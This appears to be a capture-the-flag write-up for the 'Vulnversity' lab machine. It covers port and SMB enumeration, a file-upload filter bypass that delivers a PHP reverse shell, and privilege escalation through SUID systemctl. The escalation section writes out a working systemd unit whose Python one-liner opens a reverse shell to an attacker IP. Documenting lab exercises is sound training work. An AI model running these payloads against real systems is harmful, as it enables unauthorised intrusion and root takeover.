# Vulnversity

## Preparation

Added IP to /etc/hosts as vuln.hack

## Recon

Using Ping to identify OS
```
ping vuln.hack
PING vuln.hack (10.10.149.210) 56(84) bytes of data.
64 bytes from vuln.hack (10.10.149.210): icmp_seq=12 ttl=61 time=316 ms
```
Likely Linux.

Using nmap to identify all ports.
```
nmap -v -r -p- -T4 -oA recon/nmap/allports vuln.hack
...
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3128/tcp open  squid-http
3333/tcp open  dec-notes
```

Using nmap to enumerate service versions.
```
nmap -v -r -p 21,22,139,445,3128,3333 -sV -sC -oA recon/nmap/fingerprinting vuln.hack
...
# Nmap 7.80 scan initiated Tue Jun  9 13:40:55 2020 as: nmap -v -r -p 21,22,139,445,3128,3333 -sV -sC -oA recon/nmap/fingerprinting vuln.hack
Nmap scan report for vuln.hack (10.10.149.210)
Host is up (0.35s latency).

PORT     STATE SERVICE      VERSION
21/tcp   open  ftp          vsftpd 3.0.3
22/tcp   open  ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5a:4f:fc:b8:c8:76:1c:b5:85:1c:ac:b2:86:41:1c:5a (RSA)
|   256 ac:9d:ec:44:61:0c:28:85:00:88:e9:68:e9:d0:cb:3d (ECDSA)
|_  256 30:50:cb:70:5a:86:57:22:cb:52:d9:36:34:dc:a5:58 (ED25519)
139/tcp  open  netbios-ssn?
445/tcp  open  netbios-ssn  Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
3128/tcp open  http-proxy   Squid http proxy 3.5.12
|_http-server-header: squid/3.5.12
|_http-title: ERROR: The requested URL could not be retrieved
3333/tcp open  http         Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Vuln University
Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h20m01s, deviation: 2h18m36s, median: 0s
| nbstat: NetBIOS name: VULNUNIVERSITY, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   VULNUNIVERSITY<00>   Flags: <unique><active>
|   VULNUNIVERSITY<03>   Flags: <unique><active>
|   VULNUNIVERSITY<20>   Flags: <unique><active>
|   \x01\x02__MSBROWSE__\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: vulnuniversity
|   NetBIOS computer name: VULNUNIVERSITY\x00
|   Domain name: \x00
|   FQDN: vulnuniversity
|_  System time: 2020-06-09T14:43:28-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2020-06-09T18:43:26
|_  start_date: N/A

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun  9 13:43:45 2020 -- 1 IP address (1 host up) scanned in 170.36 seconds
```

### FTP (21/TCP)

No anonymous login.

### SMB (445/TCP)

Null SID
```
smbclient -U '' -L vuln.hack
Enter WORKGROUP\'s password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (vulnuniversity server (Samba, Ubuntu))
SMB1 disabled -- no workgroup available
```

Cannot access print share.
```
smbclient -U '' \\\\vuln.hack\\print$
Enter WORKGROUP\'s password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```

### HTTP (3333/TCP)

Enumerating directories
```
gobuster dir -u http://vuln.hack:3333/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -o recon/gobuster/root-big.txt 2> recon/gobuster/root-big.txt.err
```

There is a directory called "/internal" and it has a file upload function. Trying to upload a PHP webshell.

## Cracking the Perimeter

Using shellclip to make a PHP reverse shell.

PHP extensions are blocked. PHTML worked (used BurpSuite to fuzz the upload form). Looking for where it uploads.

http://vuln.hack:3333/internal/uploads/rev.phtml

Got a shell!
```
connect to [10.2.14.14] from (UNKNOWN) [10.10.149.210] 53146
/bin/sh: 0: can't access tty; job control turned off
$
```

User flag in /home/bill/

## Persistance

Persistence as www-data set on port 5253.

Downloaded to /dev/shm/ with wget

## Privilege Escalation

/bin/systemctl has the SUID bit set

Terminal is not fully functional so the screen buffer exploit may not work. Using GTFOBins SUID template.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /montys.txt"
[Install]
WantedBy=multi-user.target' > $TF

systemctl link $TF
systemctl enable --now $TF
```

Used that to grab the flag. Coverting it to get a shell. Creating a service to make a reverse shell connection.

```
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/usr/bin/python -c "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.2.14.14\",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
[Install]
WantedBy=multi-user.target' > $TF

/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```

Got a root shell by running that code and setting up a listener on 31337!